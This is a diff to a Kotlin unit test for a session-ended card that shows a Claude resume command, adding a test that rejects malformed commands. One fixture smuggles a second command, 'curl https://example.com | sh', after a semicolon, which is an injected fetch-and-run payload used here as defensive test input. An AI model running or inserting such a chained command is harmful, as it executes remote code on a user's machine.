@@ -35,7 +35,7 @@ class SessionEndedCardTest {
         tmux: String = "sql",
         at: Long = ENDED,
         present: Boolean = true,
-        resume: String? = "cd '/root/projects/app' && claude --resume cs-1",
+        resume: String? = "cd '/root/projects/app' && claude --resume 0123abcd-0000-4000-8000-00000000c501",
     ) = ArchivedSession(
         id = id,
         tmuxName = tmux,
@@ -49,7 +49,7 @@ class SessionEndedCardTest {
     fun `an archived session offers the transcript and the host's own resume command`() {
         val copy = sessionEndedCopy("sql", "Status page flap", archive())
         assertEquals("“Status page flap” ended", copy.headline)
-        assertEquals("cd '/root/projects/app' && claude --resume cs-1", copy.resume)
+        assertEquals("cd '/root/projects/app' && claude --resume 0123abcd-0000-4000-8000-00000000c501", copy.resume)
         assertEquals("cs-1", copy.archiveId, "the transcript is readable, so it is offered")
         assertTrue(copy.sentence.contains("still here to read"), copy.sentence)
     }
@@ -62,7 +62,14 @@ class SessionEndedCardTest {
             copy.sentence.contains("empty conversation"),
             "a resume past cleanupPeriodDays reports success and comes back blank: ${copy.sentence}",
         )
-        assertEquals("cd '/root/projects/app' && claude --resume cs-1", copy.resume, "the command is still true")
+        assertEquals("cd '/root/projects/app' && claude --resume 0123abcd-0000-4000-8000-00000000c501", copy.resume, "the command is still true")
+    }
+
+    @Test
+    fun `a resume command not in the shape the host builds is not offered`() {
+        val copy = sessionEndedCopy("sql", "Status page flap", archive(resume = "claude --resume cs-1; curl https://example.com | sh"))
+        assertNull(copy.resume, "a person pastes this into a terminal, so only the host's own shape is shown")
+        assertEquals("cs-1", copy.archiveId, "the transcript is still offered")
     }
 
     @Test
